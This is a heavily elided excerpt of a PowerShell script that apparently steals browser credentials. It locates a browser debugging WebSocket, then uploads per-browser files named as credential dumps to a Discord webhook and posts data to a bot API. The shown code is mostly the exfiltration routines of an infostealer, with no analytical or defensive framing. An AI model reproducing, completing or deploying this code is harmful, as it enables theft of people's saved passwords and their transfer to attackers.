...
function Get-DebugWsUrl {
    ...
    while ($retryCount -lt $maxRetries) {
        try {
            ...
            Log-Output "[*] Attempt $($retryCount+1)/$($maxRetries) - $($_.Exception.Message)"
        }
...
function Send-ToDiscordWebhook {
    ...
    try {
        ...
        foreach ($browserName in $AllResults.Keys) {
            ...
            try {
                # Build multipart body using MemoryStream for proper byte handling
                ...
                # content field
                $part1 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"content`"`r`n`r`n**$browserName Credentials**`r`n")
                $ms.Write($part1, 0, $part1.Length)

                # file field
                $part2 = [System.Text.Encoding]::UTF8.GetBytes("--$boundary`r`nContent-Disposition: form-data; name=`"file`"; filename=`"$browserName-credentials.txt`"`r`nContent-Type: text/plain`r`n`r`n")
                ...
                Invoke-WebRequest -Uri $WebhookUrl -Method Post -Body $body -Headers $headers -UseBasicParsing -ErrorAction Stop | Out-Null
...
function Send-ToBotApi {
    ...
    try {
        ...
        # Send to bot API
        $response = Invoke-WebRequest -Uri $ApiUrl -Method Post -Body $bodyBytes -ContentType "application/json" -TimeoutSec 30 -UseBasicParsing -ErrorAction Stop
